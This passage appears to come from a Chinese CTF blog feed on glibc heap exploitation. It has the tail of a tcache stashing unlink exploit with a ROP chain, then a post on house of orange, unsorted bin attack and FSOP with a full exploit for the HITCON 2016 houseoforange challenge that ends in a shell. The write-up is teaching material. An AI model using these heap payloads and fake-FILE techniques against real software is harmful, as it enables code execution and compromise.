class="number">5</span>)</span><br><span class="line">    edit(<span class="number">1</span>,payload)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">2</span>,p64(malloc_hook))</span><br><span class="line">    backdoor(shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>))</span><br><span class="line">    backdoor(p64(add_rsp_ret))</span><br><span class="line">    pop_rdi=libc_base+<span class="number">0x0000000000026542</span></span><br><span class="line">    pop_rsi=libc_base+<span class="number">0x0000000000026f9e</span></span><br><span class="line">    pop_rdx=libc_base+<span class="number">0x000000000012bda6</span></span><br><span class="line">    open_addr=libc_base+<span class="number">0x000000000010cc80</span></span><br><span class="line">    read_addr=libc_base+<span class="number">0x000000000010cf70</span></span><br><span class="line">    write_addr=libc_base+<span class="number">0x000000000010d010</span></span><br><span class="line">    flag_addr=libc_base+<span class="number">0x0000000000016239</span></span><br><span class="line">    syscall_addr=libc_base+<span class="number">0x0000000000026bd4</span></span><br><span class="line">    pop_rax=libc_base+<span class="number">0x0000000000047cf8</span></span><br><span class="line">    mprotect_addr=libc_base+<span class="number">0x0000000000117590</span></span><br><span class="line">    </span><br><span class="line">    rop=p64(pop_rdi)+p64((leak_heap&gt;&gt;<span class="number">12</span>)*<span class="number">0x1000</span>)</span><br><span class="line">    rop+=p64(pop_rsi)+p64(<span class="number">0x4000</span>)</span><br><span class="line">    rop+=p64(pop_rdx)+p64(<span class="number">7</span>)</span><br><span class="line">    rop+=p64(mprotect_addr)</span><br><span class="line">    rop+=p64(leak_heap+<span class="number">0x1180</span>)</span><br><span class="line">    rop+=p64(<span class="number">0xdeadbeef</span>)*<span class="number">20</span></span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x16DE</span>,<span class="number">0x16ea</span>,<span class="number">0x16f6</span>,<span class="number">0x1702</span>,<span class="number">0x15C3</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">1</span>,rop)</span><br><span class="line">    </span><br><span class="line">create_chain()</span><br><span class="line">libc_base,leak_heap=leak_addr()</span><br><span class="line">get_into_smallbin()</span><br><span class="line">tcache_stashing_unlink_attack(leak_heap,libc_base)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221026221010006.png" alt="image-20221026221010006"></p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.anquanke.com/post/id/198173?display=mobile#h2-0">Tcache Stashing Unlink Attack利用思路-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p><a href="https://blog.csdn.net/weixin_46521144/article/details/119536209">https://blog.csdn.net/weixin_46521144/article/details/119536209</a></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>tcache stashing unlink attack</tag>
      </tags>
  </entry>
  <entry>
    <title>关于house of orange(unsorted bin attack &amp;&amp;FSOP)的学习总结</title>
    <url>/posts/f0d8c344.html</url>
    <content><![CDATA[<h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>通过学习house of orange，又对unsorted bin attack以及FSOP有了一些新的理解。说到底house of orange本身的效果很小，但加上两个组合拳(unsorted bin attack和FSOP)则威力就会变的很大。这篇文章我将对这三种手法都详细记录一下原理和利用方式，最后放上例题。</p>
<span id="more"></span>

<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>在此，先对house of orange以及后续整体的流程简单总结一下：</p>
<blockquote>
<p> 最开始我们先用house of orange将原本的top chunk放入unsorted bin中。然后利用溢出篡改unsorted bin里的chunk的size为0x60，同时还篡改了该chunk的bk指针。最后我们申请一个任意大小的chunk，开始触发攻击链，首先ptmalloc会先遍历unsorted bin(此时前面已经遍历了fast bin和small bin)，ptmalloc的策略是一边遍历unsorted bin尝试寻找和自己需要的size完全相同的chunk，一边给不符合条件的chunk分下类(也就是放到small bin或者large bin)。在分类的时候就会将在unsorted bin上的chunk给脱链，然后触发unsorted bin attack，此时的IO_list_all被写入main_arena+88的地址，然后发现chunk的size为0x60，于是给划分到了small bin里。而_IO_2_1_stderr的_chain字段正好落在了small bin[0x60]上，于是乎我们就控制了_IO_2_1_stdout里的内容。然后为了接下来的FSOP攻击做好布局(控制stdout结构体其实就是堆溢出来编辑最开始进入的那个unsorted bin里的堆块内容)。然后ptmalloc还会继续去遍历unsorted bin(因为unsorted bin被unsorted bin attack攻击破坏的原因，让ptmalloc以为unsorted bin还有chunk)，但是此时的victim(也就是当前unsorted bin准备链出的chunk)已经是最开始覆盖unsorted bin bk的值了(也就是IO_list_all-0x10)。然此时的victim-&gt;size为0，没有通过检查，于是就触发了malloc_printerr，调用了abort，最终刷新所有文件流的时候，到stdout结构体时触发了FSOP，成功获取shell。</p>
</blockquote>
<p>其实整体流程就是把后续的unsorted bin attack和FSOP运用到了极致。</p>
<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><blockquote>
<p>什么是house of orange?</p>
<p>house of orange该攻击手法是在我们没有free函数的情况下，来获得一个在unsorted bin中的堆块。house of orange到这里就结束了，但之后还会利用其他的手法来拿到shell。</p>
<p>原理：</p>
<p>如果我们申请的堆块大小大于了top chunk size的话，那么就会将原来的top chunk放入unsorted bin中，然后再映射或者扩展一个新的top chunk出来。</p>
<p>利用过程：</p>
<p>1、先利用溢出等方式进行篡改top chunk的size(具体要求的话下面再说)</p>
<p>2、然后申请一个大于top chunk的size</p>
</blockquote>
<p>然后主要说一下我们具体需要绕过的检查</p>
<p>主要就是下面两个断言(如下)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">old_top = av-&gt;top;<span class="comment">//原本old top chunk的地址</span></span><br><span class="line">old_size = chunksize (old_top);<span class="comment">//原本old top chunk的size</span></span><br><span class="line">old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size));<span class="comment">//old top chunk的地址加上其size</span></span><br><span class="line"></span><br><span class="line">brk = snd_brk = (<span class="type">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">assert ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果是第一次调用该函数，那么top chunk是没有被初始化的，并且其size自然为0 ，我们利用的时候，这里肯定不成立，暂且不用管</p>
<p>如果上面这个条件不成立的话，就需要保证原本old top chunk的size大于MINSIZE,还需要保证原本old top chunk的prev_inuse位是1,并且原本old top chunk的地址加上其size之后的地址要与页对齐 也就是address&amp;0xfff&#x3D;0x000。最后old chunk的size必须要小于我们申请的堆块大小加上MINSIZE。</p>
<p>最后就是要注意如果我们申请的堆块大于了0x20000，那么将会是mmap映射出来的内存，并非是扩展top chunk了。</p>
<p>总结下，我们需要绕过检查所需要构造的值：</p>
<p>old_top_size(我们通过溢出修改)     nb（我们申请的堆块大小）</p>
<blockquote>
<p>MINSIZE&lt;old_top_size&lt;nb+MINSIZE</p>
<p>old_top_size的prev_size位是1</p>
<p>(old_top_size+old_top)&amp;0xfff&#x3D;0x000</p>
<p>nb&lt;0x20000</p>
</blockquote>
<p>构造完成后，我们申请出来nb大小的堆块，那么top chunk就会进入到unsorted bin中。</p>
<p><img src="/../img/2706180-20220920201613897-1312734603.png"></p>
<p><img src="/../img/2706180-20220920201634834-439114022.png"></p>
<p>此时就完成了攻击前的准备阶段，而接下来需要先介绍一下unsorted bin attack。</p>
<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>unsorted bin attack这个攻击手法最终可以实现往一个指定地址里写入一个很大的数据（main_arena+88或main_arena+96）</p>
<p>关于这个手法的学习，必须要搞清楚两件事，不然理解起来挺懵的。</p>
<p>第一、从unsorted bin中取堆块的时候，是从尾部取的堆块。</p>
<p><img src="/../img/2706180-20220920201921204-253619976.png"></p>
<p>第二、把上述的情况，画成图，应该是下面这个样子</p>
<p><img src="/../img/2706180-20220920202016161-564133422.png"></p>
<p>知道上面这两件事之后，下面理解起来就很容易了。</p>
<p>就是当从unsorted bin中拿取最后一个堆块时（unsorted bin中堆块是从最后一个取的，跟fastbin和tcachebin还不一样），会触发下面这部分的操作。<strong>(下面这部分操作是在遍历unsorted bin给其堆块分类到small bin或者large bin中完成的，也就是说我们只要覆写了unsorted bin中chunk的bk指针，在下一次遍历unsorted bin的时候，都可以让bk+0x10的位置写入main_arena+88&#x2F;96的地址(无论nb是否等于size)，但是如果申请的大小不等同于原本位于unsorted bin中的堆块，就会在后续的检查中导致程序崩溃。)</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = unsorted_chunks (av)-&gt;bk</span><br><span class="line">bck = victim-&gt;bk</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av)</span><br></pre></td></tr></table></figure>

<p>如果看着代码挺懵，我就简单分析一下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">victim = unsorted_chunks (av)-&gt;bk</span><br><span class="line">这个就是说把main_arena（这里的main_arena我的指的是上图的那个main_arena bins[0,1]这个块)的bk指针指向的内容（也就是chunk3的地址）给victim</span><br><span class="line">换言之，这行代码的意思就是说victim就是chunk3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bck = victim-&gt;bk</span><br><span class="line">这个就是把chunk3的bk指针指向的内容（也就是chunk2)给bck</span><br><span class="line">换言之，这行代码的意思就是说bck就是chunk2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck</span><br><span class="line">这个就是把现在的chunk2地址给main_arena的bk指针</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bck-&gt;fd = unsorted_chunks (av)</span><br><span class="line">这个就是把main_arena的地址给bck（也就是chunk2)的fd指针</span><br></pre></td></tr></table></figure>

<p>而这四步之后，也就将chunk3从这个双向链表中踢了出去。</p>
<p>这四步中，我们可以从第二步进行攻击，如果我们可以利用溢出来伪造这个bck(也就是victim-&gt;bk，<strong>大白话就是用溢出unsorted bin中的尾部的chunk的bk指针（fd指针无所谓）</strong>），这就意味着我们可以将unsorted_chunks (av)(这个也就是main_arena+88&#x2F;96的地址)写入到我们伪造的bck-&gt;fd(也就是bck+0x10)中。<strong>如果我们将伪造的地址先-0x10，那么最后这个伪造的地址就会被写入main_arena+88或main_arena+96的地址。</strong>伪造之后，我们从unsorted bin中将堆块申请出来<strong>(如果篡改的这个位于unsorted bin中的堆块size为0x900，那就必须要申请0x900堆块，不能小于(因为这样会将堆块进行切割)也不能大于(因为大于的话就不会从unsorted bin中拿堆块了))，当把0x900的堆块申请出来时，就完成了地址写入。</strong></p>
<p>听起来感觉挺秀，但是仔细一想似乎没啥用，好像这只能把一个很大的数值写到我们指定的地点（因此这个攻击也是一个辅助的攻击手段，还需要配合其他攻击才能发挥出来相当大的效果）。</p>
<blockquote>
<p><strong>注意：由于执行完unsorted bin attack 后的chunk2已经变成了一个libc中的地址（应该是main_arena+88的地址），接下来再从unsorted bin中申请堆块时，执行bck-&gt;fd这步试图往libc这个不可写的地址写入数据，而导致程序崩溃。<u>所以unosrtedbin attack之后，无法再从unsorted bin中申请堆块了</u></strong></p>
</blockquote>
<p>配合刚才的house of orange攻击后产生的位于unsorted bin中的堆块，如果我们能够覆盖这个位于unsorted bin中堆块的bk指针，那么我们就能够往任意地址写一个main_arena+88(96)。而我们要去通过unsorted bin attack向_IO_list_all写入这个地址main_arena+88,然后去打一个FSOP。</p>
<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP:"></a>FSOP:</h2><p>FSOP的核心是去篡改_IO_list_all和_chain，来劫持IO_FILE结构体。让IO_FILE结构体落在我们可控的内存上。然后在FSOP中我们使用_IO_flush_all_lockp来刷新_IO_list_all链表上的所有文件流，也就是对每个流都执行一下fflush，而fflush最终调用了vtable中的_IO_overflow</p>
<p>而前面提到了，我们将IO_FILE结构体落在我们可控的内存上，这就意味着我们是可以控制vtable的，<strong>我们将vtable中的_IO_overflow函数地址改成system地址即可</strong>，而这个函数的第一个参数就是IO_FILE结构体的地址，因此我们让IO_FILE结构体中的flags成员为&#x2F;bin&#x2F;sh字符串，那么当<strong>执行exit函数</strong>或者<strong>libc执行abort流程时</strong>或者<strong>程序从main函数返回时</strong>触发了_IO_flush_all_lockp即可拿到shell</p>
<p>下面是链表的正常结构</p>
<p><img src="/../img/2706180-20220920202054550-1462970818.png"></p>
<p>下面是FSOP的布局，首先篡改_IO_list_all为main_arena+88这个地址(因为这片内存是不可控的)，chain字段是首地址加上0x68偏移得到的。因此chain字段决定了下一个IO_FILE结构体的地址为main_arena+88+0x68，这个地址恰好是smallbin中size为0x60的数组，如果我们能将一个chunk放到这个small bin中size为0x60的链上，那么篡改_IO_list_all为main_arena+88这个地址后，small bin中的chunk就是IO_FILE结构体了，将其申请出来后，我们就可以控制这块内存了，从而伪造vtable字段进行布局最终拿到shell。</p>
<p><img src="/../img/2706180-20220920202121457-1221438245.png"></p>
<p>下面说一下布局时需要篡改哪些字段来绕过if的检查。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">			    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure>

<p>观察上面的代码发现，如果我们要想执行_IO_OVERFLOW (fp, EOF)就需要让最外面的if中&amp;&amp;前面的那部分成立，而这部分中间又用了一个||来连接两个条件，分别是<code>(fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>和<code>_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr&gt; fp-&gt;_wide_data-&gt;_IO_write_base</code><br>这两部分条件任意满足一处即可，前面那个部分的条件满足起来很省事，我们只需要让mode&#x3D;0,_IO_write_ptr&#x3D;1,_IO_write_base&#x3D;0即可(这仨值改成其他的也行，只需要满足条件即可)，这样就会触发_IO_OVERFLOW。</p>
<p><strong>注意：</strong></p>
<p>为什么house of orange后打FSOP成功的概率是1&#x2F;2？</p>
<p>由于触发了_IO_flush_all_lockp函数，会根据_IO_list_all和chain字段来去依次遍历链表上的每个结构体，在我们整体布局完成后，第一个结构体就是从main_arena+88开始。而第一个结构体的mode字段是main_arena+88+0xc0处的数据决定的(如下图)。<strong>mode字段是四字节</strong></p>
<p><img src="/../img/2706180-20220920202140803-372395368.png"></p>
<p>而上面这个地址由于libc地址随机化 导致这个值的补码可能是正也可能是负，也就是说这四个字节可能是0到0xffffffff之间的任意值，但是如果大于0x7fffffff的话该值就为负，小于则为正。这个0xffffffff&#x2F;2的值 正好就是最大的正值为0x7fffffff 所以刚好_mode字段为负的概率是1&#x2F;2</p>
<p><strong>那为啥非要这个mode字段为负才行呢？</strong></p>
<p>因为倘若mode为正，则上面if检查的这部分<code>fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code> 就会成立。这样就会触发_IO_OVERFLOW函数(可此时在遍历第一个IO_FILE结构体)，但是我们的布局是在第二个IO_FILE结构体上，我们需要的是遍历到第二个IO_FILE结构体的时候触发 IO_OVERFLOW函数。如果遍历第一个结构体时触发了_IO_OVERFLOW函数,程序则会崩溃，因为我们无法控制vtable表项。</p>
<blockquote>
<p>house of orange中的函数调用流程为：</p>
<p>__libc_malloc-&gt;malloc_printerr-&gt;libc_message-&gt;abort-&gt;_IO_flush_all_lockp</p>
</blockquote>
<p>IO_FILE结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>vtable中的函数指针：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wstrn_jumps</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_wstr_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h3><h4 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h4><p><img src="/../img/2706180-20220920202755893-646421990.png"></p>
<h4 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h4><p><img src="/../img/2706180-20220920202813042-943539521.png"></p>
<p>在edit函数中，往堆块里写入数据时，又询问了一次size，因此edit函数中存在堆溢出。</p>
<p>不过这道题的难点在于题目中没有free函数，这就意味着我们以前的手法几乎无法利用。而house of orange可以去产生一个位于unsorted bin中的堆块。</p>
<h4 id="利用过程："><a href="#利用过程：" class="headerlink" title="利用过程："></a>利用过程：</h4><h5 id="house-of-orange-1"><a href="#house-of-orange-1" class="headerlink" title="house of orange:"></a>house of orange:</h5><p>因此我们这道题先打一个house of orange，做出来一个被释放掉的堆块再说。</p>
<p>这部分的exp如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_e,d_a,d_s)</span><br><span class="line">edit(<span class="number">0x40</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000002000000001</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>))</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>调试过程如下：</p>
<p><img src="/../img/2706180-20220920202831416-954761380.png"></p>
<p>然后我们申请一个0x1000的堆块，发现top chunk不够用了，就会将旧的top chunk给释放掉(如下)</p>
<p><img src="/../img/image-20221007234332601.png"></p>
<h5 id="泄露地址："><a href="#泄露地址：" class="headerlink" title="泄露地址："></a>泄露地址：</h5><p>此时我们通过打house of orange得到了一个unsorted bin中的堆块，但是为了之后的手法顺利进行，我们还需要拿到一个堆地址和libc地址。而这道题其实还存在一个漏洞，就是忘记在输入函数中输入数据后，给字符串末尾加上\x00了，这就导致了只要让堆块进入unsorted bin中，就会残留fd和bk指针，再次申请的时候即可泄露libc。但是我们还需要堆地址，就需要申请一个largebin size的chunk。</p>
<p>由于最初遍历unsorted bin的时候，会将其中的堆块分类放入small bin或者large bin中，这样程序中那个大堆块就会被分到large bin中，然后启用fd_nextsize和bk_nextsize指针(堆地址就会残留到这上面)</p>
<p>从large bin申请出来的chunk上面残留了libc和堆地址，我们执行show函数即可进行泄露</p>
<p><img src="/../img/2706180-20220920202918866-471108266.png"></p>
<p>这部分exp如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x400</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3c5188</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0x20</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_heap&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h5 id="unsorted-bin-attack："><a href="#unsorted-bin-attack：" class="headerlink" title="unsorted bin attack："></a>unsorted bin attack：</h5><p>正如上文提到的，在house of orange之后，我们需要打unsorted bin attack将main_arena+88&#x2F;96的地址写入_IO_list_all。 这里利用溢出，直接去修改chunk的bk指针为_IO_list_all-0x10即可(如下图)</p>
<p><img src="/../img/2706180-20220920203032658-408826904.png"></p>
<p>这样等到下一次malloc申请堆块的时候，就会将main_arena+88的地址写入_IO_list_all（如下）</p>
<p><img src="/../img/image-20221007234402464.png" alt="image-20221007234402464"></p>
<p>由于链表头_IO_list_all已经被篡改，就导致了之后的IO_FILE结构体也都被破坏了，我们看下现在链表上第一个的结构体(如下)</p>
<p><img src="/../img/2706180-20220920203059472-1818877916.png"></p>
<p>现在的chain字段的地址如下</p>
<p><img src="/../img/2706180-20220920222700976-122227575.png"></p>
<p>而这个地址是smallbin中size为0x60的数组的位置，假设我们在smallbin中为0x60的大小的堆块，那我们将堆块申请出来，写入的数据就可以直接控制第二个IO_FILE结构体。让smallbin中出现一个0x60的堆块的方法是提前用edit函数来篡改位于unsorted bin中堆块的size，然后再次调用malloc函数的时候会去遍历各个bins，遍历unsorted bin的时候会将该bins的堆块进行分类(放入small bin或者large bin中)</p>
<p>因为篡改size为0x60，所以该堆块便会进入small bin中size为0x60的链表中。再次分配出来时，我们即可控制第二个IO_FILE结构体。(如下图，此时是堆块进入了smallbin中，可以发现此时的chain字段已经变成了我们堆块的地址)</p>
<p><img src="/../img/image-20221007234456349.png" alt="image-20221007234456349"></p>
<h5 id="FSOP："><a href="#FSOP：" class="headerlink" title="FSOP："></a>FSOP：</h5><p>上图的chain字段成功为堆地址，就说明我们已经可以控制下一个的IO_FILE结构体了，下面说一下如何构造各个字段的值来完成FSOP。</p>
<p>将_flags字段写入&#x2F;bin&#x2F;sh</p>
<p>将 _IO_write_ptr改成0x1 </p>
<p>将 _IO_write_end改成0x0</p>
<p>将_mode改成0</p>
<p>将vtable的地址改成&amp;vtable</p>
<p>然后在vtable字段后再跟16个字节的0最后写上system函数的地址即可。</p>
<p>布局完成后，结构体中的数据应该如下：</p>
<p><img src="/../img/image-20221007234516300.png" alt="image-20221007234516300"></p>
<p>然后等执行libc_message的时候会调用abort最后触发_IO_flush_all_lockp，不过在这之前我们已经布局好了IO_FILE结构体中的各个值。最终到_IO_overflow时触发system(“&#x2F;bin&#x2F;sh\x00”)获取shell。</p>
<p>unsorted bin attack和FSOP攻击都是构造数据在一个payload里的。</p>
<p>payload如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) <span class="comment">#old top chunk prev_size &amp; size 同时也是fake file的_flags字段</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) <span class="comment">#old top chunk fd &amp; bk</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x430</span>)<span class="comment">#chain</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x508</span>)<span class="comment">#vtable</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(sys_addr)<span class="comment">#DUMMY finish overflow</span></span><br></pre></td></tr></table></figure>

<p>总结下这题的整体流程：首先利用溢出来篡改top chunk的size字段，申请一个大的size来打一个house of orange让堆块进入unsorted bin中，然后申请出来的size要属于large bin的范围这样就可以同时泄露出libc和堆地址了。此时我们的unsorted bin中依然有堆块，我们去利用溢出打一个unsorted bin attack，将_IO_list_all中写入main_arena+88，这就已经控制了第一个IO_FILE结构体地址了，但是里面的字段我们控制不了，不过该结构体的chain字段地址位于small bin中size为0x60的数组，我们将unsorted bin中这个堆块的size用溢出改为0x61，这样再次申请出来后我们就可以控制第二个IO_FILE结构体了，布置好需要绕过检查的数据最后打一个FSOP即可获取shell。</p>
